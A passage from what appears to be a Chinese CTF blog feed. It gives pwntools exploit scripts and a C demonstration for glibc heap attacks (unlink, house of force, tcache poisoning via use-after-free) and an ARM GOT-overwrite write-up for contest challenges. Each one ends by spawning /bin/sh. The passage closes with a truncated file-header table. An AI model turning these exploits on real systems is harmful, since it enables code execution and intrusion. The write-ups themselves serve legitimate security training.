*(chunk-&gt;bk+0x10)=chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_fd</span>(<span class="hljs-params">c,off</span>):<br>    off1=off<br>    off=off<br>    h=<span class="hljs-built_in">hex</span>(c)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)[::-<span class="hljs-number">1</span>]<br>    e=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h),<span class="hljs-number">3</span>):<br>        e.append(h[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    uh=[]<br>    xc=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> e:<br>        hc=<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^(xc+(off&amp;<span class="hljs-number">0xfff</span>))<br>        xc=hc<br>        off=off&gt;&gt;<span class="hljs-number">12</span><br>        uh.append(<span class="hljs-built_in">hex</span>(hc)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>).zfill(<span class="hljs-number">3</span>))<br>    heap_len=<span class="hljs-built_in">len</span>(h)-<span class="hljs-number">3</span><br>    uh=<span class="hljs-string">&#x27;&#x27;</span>.join(uh[::-<span class="hljs-number">1</span>])[-heap_len:]+<span class="hljs-string">&#x27;000&#x27;</span><br>    fd=<span class="hljs-built_in">int</span>(uh,<span class="hljs-number">16</span>)+off1<br>    <span class="hljs-keyword">return</span> fd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">en_fd</span>(<span class="hljs-params">fd,next_</span>):<br>    <span class="hljs-keyword">return</span> (fd&gt;&gt;<span class="hljs-number">12</span>)^next_<br><br>p=process(<span class="hljs-string">&#x27;./unlink&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./unlink&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>chunk_list=<span class="hljs-number">0x4040a0</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x4f8</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x58</span>)<br>chunk_list_2=chunk_list+<span class="hljs-number">0x10</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x51</span>)+p64(chunk_list_2-<span class="hljs-number">0x18</span>)+p64(chunk_list_2-<span class="hljs-number">0x10</span>)<br>payload=payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(<span class="hljs-number">0x50</span>)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为chunklist中储存的时chunk+0x10，所以我们需要先伪造chunk</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>edit(<span class="hljs-number">2</span>,payload)<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(puts_got))<br>show(<span class="hljs-number">0</span>)<br>libc_d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc.address=libc_d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)+p64(free_hook))<br>edit(<span class="hljs-number">0</span>,p64(system))<br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">b&#x27;/bin/sh\00&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="house-of-force">house of force</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    在top chunk的size为unsigned long long int类型，</span><br><span class="hljs-comment">    所以如果存在堆溢出，可以修改topchunk的大小，则可以修改大小为-1</span><br><span class="hljs-comment">    设需要创建chunk的位置为x</span><br><span class="hljs-comment">    则只需要创建一个 x-top_chunk-0x20 大小的chunk</span><br><span class="hljs-comment">    再次创建chunk，chunk的地址就为x所在地址的附近了</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    在新版的libc中，在使用top chunk分裂获取chunk时，</span><br><span class="hljs-comment">    对top chunk的大小进行了检测，导致无法利用house of force</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/* ubuntu16.04</span><br><span class="hljs-comment">    gcc house_of_force.c -pie -out house_of_force</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>  *a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    a[<span class="hljs-number">3</span>]=<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> sys=system;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> top=a;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> free_hook=sys+<span class="hljs-number">0x381408</span>;<br>    top+=<span class="hljs-number">0x10</span>;<br>    <span class="hljs-type">char</span> *b=<span class="hljs-built_in">malloc</span>(free_hook-top<span class="hljs-number">-0x20</span>);<br>    <span class="hljs-built_in">memcpy</span>(b,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>,<span class="hljs-number">8</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *c=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x18</span>);<br>    c[<span class="hljs-number">1</span>]=system;<br>    <span class="hljs-built_in">free</span>(b);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻击方法二</title>
    <link href="/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/"/>
    <url>/page/heap/%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="fast-bin">fast bin</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    在较低版本中因为在获取fast bin中的chunk时没有进行检测</span><br><span class="hljs-comment">    所以如果有条件，直接修改fast bin中的chunk的fd段就可以在任意地址创建chunk了</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure><h2 id="unsorted-bin">unsorted bin</h2><h2 id="small-bin">small bin</h2><h2 id="large-bin">large bin</h2><h2 id="tcache-bin">tcache bin</h2>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第五届大学生浙江省网络安全大赛-pwn</title>
    <link href="/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/"/>
    <url>/page/wp/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="new-stack">new_stack</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-new_stack.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-new_stack-1.jpg" srcset="/img/loading.gif" lazyload alt="后门函数代码" title="后门函数代码"></p><p>后门函数会将我们输入的数据写入栈中，刚好最后<code>8字节</code>可以修改<code>X29寄存器</code>的值，而这个寄存器在程序中是用来临时储存函数第一个参数的寄存器，会用来修改<code>X0寄存器</code>，刚好在后门函数结束后会执行一次输入输出，这时可以通过修改<code>got表</code>控制程序流程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">设置X29寄存器为got表中puts项地址-0x18</span><br><span class="hljs-string">这样在每次输入时就会设置puts,read,strncpy函数对应的got表项</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=other_att(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret)) <span class="hljs-comment"># 更改程序流程</span><br>p.send(p64(puts)) <span class="hljs-comment"># 因为正常输出会输出puts函数对应got表项中的数值</span><br>                 <span class="hljs-comment"># 这时利用程序的延迟绑定技术，会使puts函数对应got表项中储存真实的puts函数地址</span><br>                 <span class="hljs-comment"># 可以用来获取libc地址</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># 先通过 LDP  X29, X30, [SP+0x30+var_30],#0x30 指令设置X29的值为栈中的数值</span><br><span class="hljs-comment"># 并将puts函数设置为system</span><br><span class="hljs-comment"># 这时向栈中写入/bin/sh ，在执行puts函数时就会执行system(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap">babyheap</h2><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-1.jpg" srcset="/img/loading.gif" lazyload alt="add函数代码" title="add函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-2.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E9%A2%84%E8%B5%9B-pwn-babyheap-4.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p>因为程序在释放时没有清空指针，存在<code>uaf</code>，且只允许同时存在<code>7</code>个<code>chunk</code>，所以必须要在<code>7</code>个<code>chunk</code>内获取<code>flag</code><br>因为存在<code>uaf</code>，所以可以先获取<code>heap段</code>地址，通过<code>heap段</code>地址就可以知道<code>tcache struct地址</code><br>只要修改<code>tcache bin</code>的值，在任意地址放置<code>chunk</code><br>可以先设置一个<code>chunk</code>的<code>size</code>为<code>0x430</code>，并在这个<code>chunk+0x430</code>的位置处构造两个<code>0x20</code>字节的<code>chunk</code> 释放这个<code>chunk</code>，就会将这个<code>chunk</code>放入<code>unsorted bin</code>中，就可以获取<code>libc</code>地址<br>这时再将<code>free_hook</code>的地址放入<code>tcache bin</code>中，就可以在<code>free_hook</code>中写入<code>system</code>，执行<code>free</code>函数调用<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=process(<span class="hljs-string">&#x27;./babyheap&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件格式头</title>
    <link href="/page/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%A4%B4/"/>
    <url>/page/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th style="text-align:left">Mime Type（Content-Type）</th><th style="text-align:left">文件扩展名</th><th style="text-align:left">文件头</th></tr></thead><tbody><tr><td style="text-align:left">video/3gpp</td><td style="text-align:left"><ul><li>3gp</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70</li><li>00 00 00 14 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">video/mp4</td><td style="text-align:left"><ul><li>mp4</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70 69 73 6f 6d</li><li>00 00 00 18 66 74 79 70</li><li>00 00 00 1c 66 74 7</td></tr><tr><td style="text-align:left">9 70</li></ul></td><td style="text-align:left"></td><td style="text-align:left"></td></tr><tr><td style="text-align:left">video/3gpp2</td><td style="text-align:left"><ul><li>3g2</li></ul></td><td style="text-align:left"><ul><li>00 00 00 14 66 74 79 70</li><li>00 00 00 20 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">video/x-m4v</td><td style="text-align:left"><ul><li>m4v</li></ul></td><td style="text-align:left"><ul><li>00 00 00 18 66 74 79 70</li></ul></td></tr><tr><td style="text-align:left">audio/mp4</td><td style="text-align:left"><ul><li>m4a</li></ul></td><td style="text-align:left"><ul><li>00 00 00 20 66 74 79 70 4d 34 41</li></ul></td></tr><tr><td style="text-align:left">image/x-icon</td><td style="text-align:left"><ul><li>ico</li></ul></td><td style="text-align:left"><ul><li>00 00 01 00</li></ul></td></tr><tr><td style="text-align:left">application/x-futuresplash</td><td style="text-align:left"><ul><li>spl</li></ul></td><td style="text-align:left"><ul><li>00 00 01 00</li></ul></td></tr><tr><td style="text-align:left">video/mpeg</td><td style="text-align:left"><ul><li>mpg</li></ul></td><td style="text-align:left"><ul><li>00 00 01 b3</li><li>00 00 01 ba</li></ul></td></tr><tr><td style="text-align:left">video/x-ms-vob</td><td style="text-align:left"><ul><li>vob</li></ul></td><td style="text-align:left"><ul><li>00 00 01 ba</li></ul></td></tr><tr><td style="text-align:left">application/vnd.lotus-1-2-3</td><td style="text-align:left"><ul><li>123</li></ul></td><td style="text-align:left"><ul><li>00 00 1a 00 05 10 04</li></ul></td></tr><tr><td 